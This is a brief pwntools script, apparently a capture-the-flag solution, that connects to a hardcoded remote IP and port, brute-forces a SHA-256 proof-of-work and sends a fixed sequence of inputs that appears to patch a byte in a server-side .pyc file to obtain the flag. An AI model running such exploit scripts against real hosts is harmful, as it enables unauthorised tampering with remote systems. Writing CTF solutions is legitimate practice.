from pwn import *
import hashlib


r=remote("3.80.56.56",10121)

## pow

temp=r.recvuntil("sha256( ")
prefix=r.recvline().split()[0]
i=0
while True:
  data=prefix+str(i)
  Hash=hashlib.sha256(data)
  if Hash.hexdigest()[:5]=="0"*5:
    r.sendline(str(i))
    break
  i+=1

## get flag
r.sendline("1")
r.sendline("nonsecret.pyc")
r.sendline("7b15")
r.sendline("71")
r.sendline("3")
r.interactive()

